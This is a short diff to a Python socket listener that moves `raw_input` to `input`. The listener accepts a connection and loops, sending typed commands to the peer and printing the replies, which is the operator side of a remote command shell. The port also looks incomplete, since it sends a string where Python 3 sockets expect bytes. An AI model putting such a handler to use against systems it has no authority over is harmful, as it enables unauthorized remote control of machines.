@@ -11,7 +11,7 @@ connection, address = listener.accept()
 print(f"[+] Got a connection from {address}.")
 
 while True:
-    command = raw_input(">> ")
+    command = input(">> ")
     connection.send(command)
     result = connection.recv(1024)
     print(result)
